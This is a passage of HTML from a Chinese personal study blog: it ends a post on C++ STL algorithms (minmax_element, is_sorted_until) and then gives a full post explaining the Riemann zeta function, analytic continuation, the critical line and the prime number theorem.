"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 输出：</span></span><br><span class="line">	<span class="comment">// 1 2 3 4</span></span><br><span class="line">	<span class="comment">// 1 2 3 4</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相比遍历赋值更简洁，需要注意<code>iota</code>初始化的序列需要指定大小</p>
<h1 id="max-amp-min"><a href="#max-amp-min" class="headerlink" title="max&amp;min"></a>max&amp;min</h1><p>获取最大值和最小值可以分别使用<code>max_element</code>和<code>max_element</code>算法</p>
<p>算法库新增了<code>minmax_element</code>用于<strong>同时获取</strong>最大值和最小值，将两者的<strong>迭代器</strong>放到一个<code>pair</code>中返回</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">4</span> &#125;;</span><br><span class="line">	<span class="keyword">auto</span> result = minmax_element(v.begin(), v.end());</span><br><span class="line">	<span class="comment">// pair</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; *result.first &lt;&lt; <span class="string">" "</span> &lt;&lt; *result.second &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="comment">// 1 9 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="判断：排序"><a href="#判断：排序" class="headerlink" title="判断：排序"></a>判断：排序</h1><p><code>is_sort</code>用于判断某个序列是否是排好序的</p>
<p><code>is_sort_until</code>则用于返回序列中前面已经排好序的<strong>部分序列</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>**argv)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">4</span> &#125;;</span><br><span class="line">	<span class="keyword">auto</span> pos = is_sorted_until(v.begin(), v.end());</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> it = v.begin(); it != pos; ++it)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="comment">// 1 2 5 7 9</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> is_sort = is_sorted(v.begin(), v.end());</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; is_sort &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="comment">// 0</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/14/黎曼猜想的学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/14/黎曼猜想的学习/" itemprop="url">黎曼猜想的学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-14T09:54:35+08:00">
                2019-01-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/01/14/黎曼猜想的学习/" class="leancloud_visitors" data-flag-title="黎曼猜想的学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>先介绍一些相关背景</p>
<p>本文的部分标题按照<strong>“提出问题，描述背景理论，解决问题”</strong>来设置</p>
<h1 id="欧拉乘积公式"><a href="#欧拉乘积公式" class="headerlink" title="欧拉乘积公式"></a>欧拉乘积公式</h1><p>zeta函数和素数间的第一个联系由欧拉发现，n为自然数，p为素数</p>
<p><img src="/2019/01/14/黎曼猜想的学习/1.jpg" alt="1"></p>
<p>欧拉首先从一般的zeta函数开始</p>
<p><img src="/2019/01/14/黎曼猜想的学习/2.jpg" alt="2"></p>
<p>将等式两边同时乘以第二项</p>
<p><img src="/2019/01/14/黎曼猜想的学习/3.jpg" alt="3"></p>
<p>接着从zeta函数中减去结果表达式</p>
<p><img src="/2019/01/14/黎曼猜想的学习/4.jpg" alt="4"></p>
<p>继续下去</p>
<p><img src="/2019/01/14/黎曼猜想的学习/5.jpg" alt="5"></p>
<p>这个不难推导，类似”筛法”，最终结果如下</p>
<p><img src="/2019/01/14/黎曼猜想的学习/6.jpg" alt="6"></p>
<blockquote>
<p>欧拉实际上构造了一个筛子，它和埃拉托斯特尼筛法很像。它将非素数从 zeta 函数中筛了出去。</p>
</blockquote>
<p>简化后就得到了一开始的等式</p>
<p><img src="/2019/01/14/黎曼猜想的学习/1.jpg" alt="1"></p>
<p>该恒等式展示了素数与zeta函数间的联系</p>
<blockquote>
<p>将s = 1代入，就得到了无限调和级数，再次证明了素数的无限性</p>
</blockquote>
<p>这里要说明的一点，s&gt;1才成立，因为是<strong>收敛</strong>的，才可以当作一个正常的数运算，比如乘以一个数，否则就可能发生各种奇奇怪怪的错误</p>
<h1 id="两个自然数互质的概率"><a href="#两个自然数互质的概率" class="headerlink" title="两个自然数互质的概率"></a>两个自然数互质的概率</h1><p>可以这样思考，首先考虑两个自然数有公约数2的概率，等价于都可以表示成$ 2n $ ，最终概率也就是$ 1-\frac{1}{2^2} $</p>
<p>以此类推，两个自然数不存在公约数3的概率就是$ 1-\frac{1}{3^2}​$</p>
<p>最后，两个自然数互质，等价于他们既没有公约数2，也没有3，也没有5等等</p>
<p>因此，互质概率等于上面所有概率的乘积</p>
<p><img src="/2019/01/14/黎曼猜想的学习/7.jpg" alt="7"></p>
<blockquote>
<p>一涉及无穷，难免有点匪夷所思…</p>
</blockquote>
<p>这个表达式，实际上就是s=2时欧拉乘积公式的右边部分，也就是$ \frac{1}{ζ(2)} $</p>
<blockquote>
<p>高中时读过欧拉的事迹，简直就是神…</p>
</blockquote>
<p>而根据定义，$ ζ(2) = \sum\limits_{i=1}^{\infty}{\frac{1}{i^2}} ​$</p>
<p>而右式的值等于$ \frac{\pi^2}{6} $</p>
<blockquote>
<p>这个值也是<strong>欧拉</strong>算出来的，不过最初的证明不太严谨，但不失为一个美妙的证明</p>
</blockquote>
<p>所以，两个自然数互质的概率是 $ \frac{6}{\pi^2} $，约等于<strong>60.79%</strong></p>
<p>可以用计算机来验证一下，在1到32768之间随机取两个数的概率与理论值的差别非常小</p>
<blockquote>
<p>以数值分析的眼光看，会发现这是相当粗糙的实验，在考虑全体自然数性质时，这个上限小的甚至是可笑的，但是这里可以发现，随着取样范围的增大，概率值收敛得是十分快的</p>
</blockquote>
<p>补充一些</p>
<blockquote>
<p>根据同样的推理，<strong>任选s个自然数，互质的概率就是$ \frac{1}{ζ(s)}$</strong></p>
<p>很容易看出，s越大，s个自然数互质的概率就越大，因为某个质数刚好是s个自然数的共同质因子的可能性就越来越低了</p>
<p>而从ζ函数的角度考察，$ \frac{1}{n^{-s}}$当s&gt;1时时减函数，所以对其求和也是减函数，所以ζ函数的倒数在增大，s个自然数互质的概率也越来越大</p>
</blockquote>
<p>同时s为偶数时的无穷级数和是可以简单的计算出来的，并且都和$ \pi $相关，奇数就复杂了…</p>
<p><img src="/2019/01/14/黎曼猜想的学习/8.jpg" alt="8"></p>
<p>没错，又是<strong>欧拉</strong></p>
<p>γ又叫做欧拉常数，<del>为什么要说又呢</del></p>
<h1 id="全体自然数之和"><a href="#全体自然数之和" class="headerlink" title="全体自然数之和"></a>全体自然数之和</h1><p>至此<strong>黎曼</strong>终于要出场了</p>
<p>他的基本目标是对质数的分布获得一个明确的表达式，提出了著名的<strong>黎曼猜想</strong></p>
<p>同时，他的推导过程中有一个副产品甚至更有名：全体自然数之和为$ -\frac{1}{12}$</p>
<script type="math/tex; mode=display">
\sum\limits_{i=1}^{\infty}{i} = -\frac{1}{12}</script><p>已经提到，研究质数分布的基本出发点是<strong>欧拉乘积公式</strong></p>
<p><img src="/2019/01/14/黎曼猜想的学习/9.jpg" alt="9"></p>
<p>这个公式两端出现的<strong>s</strong>是一个变量，当且仅当<code>s &gt; 1</code>时，欧拉乘积公式成立</p>
<h2 id="黎曼提出的要点"><a href="#黎曼提出的要点" class="headerlink" title="黎曼提出的要点"></a>黎曼提出的要点</h2><ol>
<li>我们应该把$ζ(s)$中的自变量s理解为<strong>复数</strong>，而不只是实数</li>
<li>可以通过<strong>解析延拓</strong>，让$ζ(s)$在<code>s &lt; 1</code>时也获得定义</li>
<li>通过对ζ(s)的研究，我们可以对<strong>小于等于某个数x的质数的个数</strong>给出一个明确的表达式，在这个表达式中唯一未知的就是ζ(s)的<strong>零点</strong>的位置</li>
<li>黎曼猜测，ζ(s)的零点都位于某些地方，这个猜测就是<strong>黎曼猜想</strong></li>
</ol>
<h2 id="解析延拓"><a href="#解析延拓" class="headerlink" title="解析延拓"></a>解析延拓</h2><p><img src="/2019/01/14/黎曼猜想的学习/10.jpg" alt="10"></p>
<p>至此，<strong>欧拉ζ函数升级为黎曼ζ函数</strong></p>
<p>假如仍然用s &gt; 1时的定义，那么ζ(-1)就是全体自然数的和</p>
<p>但实际上，ζ(-1)已经换了一个定义</p>
<p>也就是<strong>黎曼的ζ(-1) =  $ -\frac{1}{12} ​$</strong></p>
<blockquote>
<p>量子场论，超弦理论中经常会用到这个命题</p>
</blockquote>
<p><strong>解析延拓</strong>最基本的理解：扩大函数的<strong>定义域</strong></p>
<h3 id="例1、y-x"><a href="#例1、y-x" class="headerlink" title="例1、y=x"></a>例1、y=x</h3><p>举个例子来直观理解，$ y = x , x∈[-1,1] $</p>
<p><img src="/2019/01/14/黎曼猜想的学习/11.jpg" alt="11"></p>
<p>这是一条线段，我们可以任意<strong>延伸</strong>至任意远，把定义域<strong>扩展</strong>到整个数轴</p>
<blockquote>
<p>但是解析延拓，重点在<strong>解析</strong>，延续了原始函数的<strong>自然趋势</strong></p>
<p>所以我们不能乱延伸……</p>
</blockquote>
<p><strong>一个函数的解析延拓是唯一的</strong></p>
<blockquote>
<p>mac ctrl+A 行首 ctrl+E 行尾</p>
</blockquote>
<h3 id="一般方法：幂级数"><a href="#一般方法：幂级数" class="headerlink" title="一般方法：幂级数"></a>一般方法：幂级数</h3><p>假如一个函数$ y = f(x) ​$在某个点$ x_0 ​$附近等于一个<strong>幂级数</strong>，那么称这个函数在这一点是<strong>解析(analytic)</strong>的</p>
<p>这也是<strong>“解析”</strong>这个词的<strong>严格定义</strong>。</p>
<p><img src="/2019/01/14/黎曼猜想的学习/12.jpg" alt="12"></p>
<p>回到之前的<code>y=x</code>的例子，它本身就是一个幂级数，其中$ x_0 = 0 $，也就是说它在<strong>原点</strong>处等于一个幂级数，其中只有<strong>一次项</strong>的系数为1，其它都为0；当然对于原点之外的$ x_0 $仍然是一个幂级数，都是<strong>解析</strong>的</p>
<h4 id="收敛半径"><a href="#收敛半径" class="headerlink" title="收敛半径"></a>收敛半径</h4><p>对于一个幂级数，一个很重要的性质是它的<strong>收敛半径(radius of convergence)</strong></p>
<p>也就是说，一个幂级数并不总是收敛的，或者说并不总是能算出一个有限值</p>
<p>如果离中心点$ x_0 $太远，幂级数就可能变成无穷大，也就是发散了</p>
<p>对于 <code>y = x</code>，它的收敛半径是无穷大，也就是说在任何地方都收敛</p>
<h3 id="例2、等比级数"><a href="#例2、等比级数" class="headerlink" title="例2、等比级数"></a>例2、等比级数</h3><p><img src="/2019/01/14/黎曼猜想的学习/13.jpg" alt="13"></p>
<p>我们要求无穷多项的和，如果$ -1 &lt; x &lt; 1 $，则当k趋于无穷时，$ x^k $趋于0，所以求和结果会趋于$ \frac{1}{1-x} ​$</p>
<p>而若$ x &gt; 1 $或$ x &lt; -1 $，求和结果显然会趋于无穷大</p>
<p>得出结论：等比级数的<strong>收敛半径</strong>等于1，在这个收敛半径之内它等于$ \frac{1}{1-x} $，而在收敛半径之外它发散</p>
<blockquote>
<p>所以等比级数的定义域最大只能到$ (-1,1) $这个区间</p>
</blockquote>
<p>接着，我们对等比级数进行解析延拓</p>
<p>在收敛半径之外，我们定义它等于$ \frac{1}{1-x} $，这样我们就获得了一个定义域更大的函数，定义域扩大到除$ x = 1$之外的所有点</p>
<h3 id="例3、格兰迪级数"><a href="#例3、格兰迪级数" class="headerlink" title="例3、格兰迪级数"></a>例3、格兰迪级数</h3><p>接着等比级数的讨论，我们把$ x = -1 $代回等比级数中，<strong>假装不知道这时函数定义已经改变了……</strong></p>
<p>在形式上得到：</p>
<p><img src="/2019/01/14/黎曼猜想的学习/14.jpg" alt="14"></p>
<p>实际上，就基本的意义而言，格兰迪级数<strong>不等于任何一个数</strong>，但在某种推广的意义上，可以认为它等于$ \frac{1}{2} $</p>
<h2 id="黎曼-zeta-1"><a href="#黎曼-zeta-1" class="headerlink" title="黎曼$\zeta(-1)$"></a>黎曼$\zeta(-1)$</h2><p>有了这些背景，我们终于可以回到<strong>全体自然数之和</strong>这个正题了……</p>
<p>首先，欧拉$ ζ(s) ​$在$ s&lt;=1 ​$时是发散的，因此没有意义</p>
<p>但是黎曼提出了一种通过$\zeta(s)$来定义$ \zeta(1-s) $的方法，使函数在$ x&lt;0 $时也获得了定义</p>
<h3 id="黎曼的函数方程"><a href="#黎曼的函数方程" class="headerlink" title="黎曼的函数方程"></a>黎曼的函数方程</h3><p>他首先非常<strong>不显然</strong>的但<strong>正确</strong>推导过程证明了以下的等式</p>
<p><img src="/2019/01/14/黎曼猜想的学习/15.jpg" alt="15"></p>
<blockquote>
<p>这里的$ Γ $是欧拉Gamma函数，是阶乘的扩展</p>
</blockquote>
<p>最重要的一点是：右边关于s的表达式中，<strong>把s换成1-s，答案不变</strong></p>
<p>因此等式左边也可以替换，因此得出：</p>
<p><img src="/2019/01/14/黎曼猜想的学习/16.jpg" alt="16"></p>
<p>这个等式叫做<strong>黎曼的函数方程</strong></p>
<p>根据这个等式，如果知道了$ \zeta(s) $，就可以算出$ \zeta(1-s) $</p>
<p>就这样黎曼$ \zeta $函数做出了解析延拓，从它已知的在$ s&gt;1 $的值，可以定义它在$ s&lt;0 $的值</p>
<h3 id="狄利克雷级数"><a href="#狄利克雷级数" class="headerlink" title="狄利克雷级数"></a>狄利克雷级数</h3><p>我们还会发现一个问题，定义域$ [0,1] $内该怎么办呢……</p>
<p>实际上在黎曼之前，已有数学家对这个区域做出了解析延拓</p>
<p>回顾之前，我们把$ n^{-s} $ 记作$ f(n) $，把所有$ f(n) $的和即$ f(1)+f(2)+f(3)+… $记作<strong>A</strong></p>
<p>把$ f(2) $乘到A上，我们会得到所有的偶数项，当时我们从A中减去$ f(2)A$，就消去了所有的偶数项，只剩下了奇数项</p>
<p>现在，我们考虑从A中减去$ 2f(2)A $，结果是：</p>
<p><img src="/2019/01/14/黎曼猜想的学习/17.jpg" alt="17"></p>
<p>右边的表达式中，<strong>正负号交替出现</strong>，这个级数叫做<strong>狄利克雷函数(Dirichlet series)</strong></p>
<blockquote>
<p>黎曼当时就是继承了狄利克雷在哥廷根大学的职位</p>
</blockquote>
<p>正是由于正负号交替出现，狄利克雷级数的收敛范围扩大了，从$ s&gt;1 $扩大到了$ s&gt;0 $</p>
<p>因此，在定义域$ [0,1] ​$中，$ \zeta(s) ​$就可以用<strong>狄利克雷函数函数除以$[1-2f(2)]​$</strong>来定义</p>
<h3 id="解析延拓之后"><a href="#解析延拓之后" class="headerlink" title="解析延拓之后"></a>解析延拓之后</h3><p>画出图像</p>
<p><img src="/2019/01/14/黎曼猜想的学习/18.jpg" alt="18"></p>
<p>其中$s=1​$仍然是无穷大</p>
<p><strong>而在$s<1$的区域，我们假装不知道ζ函数的定义已经改变了，把$s>1$时的级数代入，可以得到以下结果：</1$的区域，我们假装不知道ζ函数的定义已经改变了，把$s></strong></p>
<p><img src="/2019/01/14/黎曼猜想的学习/19.jpg" alt="19"></p>
<p><strong>其中第一项含有全体自然数之和，也含有$\zeta(-1)​$，也就是标题中提出的问题</strong></p>
<blockquote>
<p>在每个等式中都加了<strong>问号</strong>，是强调这并不是真的相等，只是一种<strong>联想</strong></p>
</blockquote>
<h1 id="黎曼-zeta-s-：复变函数"><a href="#黎曼-zeta-s-：复变函数" class="headerlink" title="黎曼$\zeta(s)$：复变函数"></a>黎曼$\zeta(s)$：复变函数</h1><p>黎曼将自变量s理解为复数，经过解析延拓之后，最终变成了这样：</p>
<p><img src="/2019/01/14/黎曼猜想的学习/20.jpg" alt="20"></p>
<blockquote>
<p>Re表示实部，Im表示虚部</p>
</blockquote>
<p>在整个复平面上，<strong>黎曼$\zeta​$函数只在$s=1​$这一点没有定义</strong></p>
<h2 id="复数相关"><a href="#复数相关" class="headerlink" title="复数相关"></a>复数相关</h2><p><strong>欧拉公式</strong></p>
<p><img src="/2019/01/14/黎曼猜想的学习/21.jpg" alt="21"></p>
<p>这对应于一个长度为1的矢量，它的方向是从实轴旋转了角度θ</p>
<p>根据欧拉公式，一个底数为实数r、指数为复数(x + yi)的乘方就等于：</p>
<p><img src="/2019/01/14/黎曼猜想的学习/22.jpg" alt="22"></p>
<p>因此，结果矢量的长度只与指数的实部x有关，与指数的虚部y无关；而它的方向只与y有关，与x无关</p>
<p>也就是说，如果给指数加上一个纯虚数，就相当于给乘方的结果做了一个<strong>旋转</strong></p>
<p>如果给指数加上一个实数，就相当于改变了乘方矢量的<strong>长度</strong>，而方向不变</p>
<p>而如果给指数加上一个实部和虚部都不等于0的复数，乘方的结果就是既改变大小，也改变方向</p>
<h2 id="复变函数相关"><a href="#复变函数相关" class="headerlink" title="复变函数相关"></a>复变函数相关</h2><p>黎曼把ζ函数的自变量s从实数扩展到了复数，也就是说把ζ函数从实变函数变成了<strong>复变函数</strong></p>
<p>好处在于：某种意义上，<strong>二维的复变函数比一维的实变函数简单</strong></p>
<blockquote>
<p>因为在数轴上接近一个点，只有两个方向，左和右，而<strong>在复平面上接近一个点，却有无穷多个方向</strong>，例如左边、右边、上边、下边以及任意倾斜的方向</p>
<p><strong>突然想到xz和我说的，函数在某一点可导意味着左导数等于右导数</strong></p>
<p>如果对无穷多个方向做计算都能得到同一个结果，那么这是一个<strong>非常强的限制条件</strong>，能通过这样的限制条件的复变函数就很容易处理</p>
<p>例如，复变函数的解析延拓就比实变函数的解析延拓容易得多</p>
<p>因此数学界有这样的笑谈：<strong>实变函数处理的都是性质非常恶劣的函数，复变函数处理的都是性质非常良好的函数。</strong></p>
</blockquote>
<p>可以说，黎曼对$\zeta$函数进行了<strong>降维打击</strong></p>
<h3 id="复变函数的零点"><a href="#复变函数的零点" class="headerlink" title="复变函数的零点"></a>复变函数的零点</h3><p>复变函数的一个特点是：许多性质都是由它的<strong>零点(zero)</strong>决定的</p>
<p>例如$±i$就是复变函数$f(z)=z^2+1$的两个零点</p>
<p>如果复平面上围着一个零点做一条曲线，然后求函数在这条曲线上的积分，会发现积分结果完全由<strong>零点的性质</strong>决定，跟曲线的具体情况没有关系</p>
<p>我们只需要知道函数<strong>在零点附近的行为</strong>就够了</p>
<h2 id="非平凡零点"><a href="#非平凡零点" class="headerlink" title="非平凡零点"></a>非平凡零点</h2><p>首先，黎曼得出了一个等式…</p>
<p><img src="/2019/01/14/黎曼猜想的学习/23.jpg" alt="23"></p>
<blockquote>
<p>左边的$J(x)$是一个<strong>阶梯函数</strong>，它在x = 0的地方取值为0，然后每经过一个质数（例如2、3、5）就增加1，每经过一个质数的平方（例如4、9、25）就增加$\frac{1}{2}$，每经过一个质数的三次方（例如8、27、125）就增加$\frac{1}{3}$，以此类推，每经过一个质数的n次方就增加$\frac{1}{n}$</p>
<p>可以理解为，<strong>一个质数的n次方被算作了$\frac{1}{n}$个质数</strong></p>
<p>显然，这个函数跟质数的分布密切相关</p>
</blockquote>
<p>等式右边的第一项$Li(x)$叫做<strong>对数积分函数(logarithmic integralfunction)</strong>，定义为：</p>
<p><img src="/2019/01/14/黎曼猜想的学习/24.jpg" alt="24"></p>
<p>在x很大的时候，$Li(x)≈\frac{x}{ln(x)}$</p>
<p>右边的第二项的函数形式仍然是<strong>对数积分函数</strong>，但是自变量是<strong>所有x的ρ次方</strong></p>
<blockquote>
<p>这里的ρ是<strong>黎曼$\zeta$函数的非平凡零点(non-trivial zeroes)</strong></p>
</blockquote>
<p>关于<strong>非平凡</strong>的解释：</p>
<blockquote>
<p>黎曼证明了，s等于-2、-4、-6、-8等负的偶数值的时候，$\zeta(s)$必然等于0</p>
<p>如果用类似于<strong>全体自然数的和等于$-\frac{1}{12}$</strong>的语言来描述，那么<strong>全体自然数的偶数次方和等于0</strong></p>
<p>在数学家们看来，这是显然的，于是他们把$\zeta$函数的这种零点叫做<strong>平凡零点(trivial zeroes)</strong></p>
<p>从高中数学竞赛的角度，<strong>显然</strong>，<strong>平凡</strong>，<strong>乏趣</strong>这三个词是等价的</p>
</blockquote>
<p>可以确定的是，<strong>非平凡零点肯定不在实轴上</strong>；也就是说，实轴上除了负偶数，没有其它零点</p>
<p>也许会问，既然非平凡零点ρ不是实数，那么x的ρ次方也不是实数，如何计算<strong>虚数自变量的对数积分函数</strong>？</p>
<p>回答是：数学家又做了一个<strong>解析延拓</strong>，把对数积分函数的定义域扩展到了复数。</p>
<p>总之，黎曼对一个与质数分布密切相关的函数$J(x)$给出了一个表达式，其中唯一不清楚的部分来自黎曼$\zeta$函数的<strong>非平凡零点</strong></p>
<h2 id="质数计数函数"><a href="#质数计数函数" class="headerlink" title="质数计数函数"></a>质数计数函数</h2><p><strong>质数计数函数(prime-counting function)</strong>，意为小于等于给定数值x的质数个数，经常写作$\pi(x)$</p>
<blockquote>
<p>不过这个名字和圆周率没什么关系</p>
</blockquote>
<p>显然，如果我们对质数计数函数知道了一个简便的计算公式，那么对第n个质数也就有了快速的算法</p>
<p>黎曼得到的并不是$\pi(x)​$而是$J(x)​$，不过这两个函数包含的信息是<strong>等价的</strong></p>
<blockquote>
<p>在这个意义上，质数分布的<strong>全部信息</strong>都包含在黎曼$\zeta$函数非平凡零点的位置之中</p>
</blockquote>
<p>其中$\pi(x)$和$J(x)$具体的关系是：</p>
<p><img src="/2019/01/14/黎曼猜想的学习/25.jpg" alt="25"></p>
<p>其中$\mu(n)$叫做<strong>莫比乌斯函数(Möbius function)</strong></p>
<blockquote>
<p>没错，就是<strong>莫比乌斯带</strong>的那个人</p>
</blockquote>
<p>莫比乌斯函数的取值只有三种可能：0和±1</p>
<p>1、如果n可以被任何一个质数的平方整除，也就是说在它的质因数分解中有一个质因数出现了二次或更高次方，那么$\mu(n)=0$</p>
<p>2、如果n不能被任何一个质数的平方整除，也就是说n的任何一个质因数都只出现一次，那么我们来数质因数的个数<br>(1)假如质因数有偶数个，那么$\mu(n) = 1$，包括了n = 1的情况，因为它没有质因数，0算作偶数，所以μ(1) = 1</p>
<p>(2)假如质因数有奇数个，那么$\mu(n) = -1$</p>
<p>由此可见，$\mu(1) = 1，\mu(2) = -1，\mu(3) = -1，\mu(4) = 0，\mu(5) = -1，\mu(6) = 1$</p>
<p>回到上式，显然$J(x)$是一个增函数，展开式中，随着n的增加，$x^{\frac{1}{n}}$变得越来越小，相应的第n项也变得越来越小</p>
<p>因此，对$\pi(x)$贡献最大的就是第一项</p>
<p>而对$J(x)$贡献最大的是哪一项？</p>
<p>这涉及<strong>黎曼$\zeta$函数非平凡零点的位置</strong></p>
<h2 id="临界带和临界线"><a href="#临界带和临界线" class="headerlink" title="临界带和临界线"></a>临界带和临界线</h2><p>一个非平凡零点ρ的实部和虚部常被记为σ和t，即ρ = σ + it</p>
<p>黎曼很快就证明了，ρ不可能出现在$σ &gt; 1$或者$σ &lt; 0$的位置</p>
<p>也就是说，非平凡零点只可能出现在$0 ≤ σ ≤ 1$的区域里</p>
<p>在复平面上，这对应一条宽度为1的竖直条带，称为<strong>临界带(critical strip)</strong></p>
<p>然后，根据黎曼$\zeta$函数的形式，很容易发现零点对于实轴是对称的</p>
<p>这表明，如果σ + it是一个零点，那么它的共轭复数σ - it也是一个零点，因此，非平凡零点总是上下成对出现的</p>
<p>当我们说第n个非平凡零点的时候，指的总是第n个虚部为正数的非平凡零点，而虚部为负数的那些自然就知道了</p>
<p>再然后，根据黎曼的函数方程，即$\zeta(s)$与$\zeta(1 – s)$之间的联系，又很容易发现，非平凡零点对于$σ = \frac{1}{2}$这条竖线是对称的</p>
<p>这表明，如果σ + it是一个零点，那么1 - σ + it也是一个零点。</p>
<h3 id="黎曼猜想"><a href="#黎曼猜想" class="headerlink" title="黎曼猜想"></a>黎曼猜想</h3><p>黎曼计算了几个非平凡零点的位置，发现它们的实部都等于$\frac{1}{2}​$</p>
<p>例如第一、二、三个非平凡零点，实部都等于$\frac{1}{2}$，而虚部分别约等于14.1347、21.0220和25.0109</p>
<p>然后，他就做出了一个猜想：</p>
<p><strong>黎曼$\zeta$函数所有的非平凡零点，实部都等于$\frac{1}{2}$</strong></p>
<p>我们把$σ = \frac{1}{2}$的这条竖线称为<strong>临界线(critical line)</strong>，也就是<strong>临界带的中心线</strong></p>
<p>我们已经知道，所有的非平凡零点都在临界带里，但<strong>黎曼猜想</strong>却大大加强了这个结论，它猜测：<strong>所有的非平凡零点都在临界线上！</strong></p>
<blockquote>
<p>至今还没有被普遍接受的证明或证伪，但是数值计算的结果为黎曼猜想提供了强有力的支持</p>
<p>已经计算了十万亿个非平凡零点，都符合这一猜想</p>
</blockquote>
<h2 id="质数定理"><a href="#质数定理" class="headerlink" title="质数定理"></a>质数定理</h2><p>随着数字的增大，质数一般而言会变得越来越<strong>稀疏</strong></p>
<p><strong>高斯</strong>发现质数分布的密度大约是<strong>对数函数的倒数</strong></p>
<p>一百多年后终于被证明了，从此被称为<strong>质数定理(prime number theorem)</strong></p>
<p>不过在方法论上，<strong>质数定理却只是研究黎曼猜想的一个中间产物</strong></p>
<blockquote>
<p>黎曼一开始就证明了：黎曼$\zeta$函数的非平凡零点只能出现在$0 ≤ σ ≤ 1$的临界带里</p>
<p>对于质数定理而言，棘手的就是那两个等于号，如果能去掉等于号，也就是把临界带去掉两条$σ = 0$和$σ = 1$的边界，让非平凡零点只能出现在临界带的内部而不是左右边界上，那么质数定理立刻就得证了</p>
<p>因为这时很容易证明，对质数计数函数$\pi(x)$的主要贡献来自对数积分函数$Li(x)$，次要贡献来自黎曼$\zeta$函数的所有非平凡零点</p>
</blockquote>
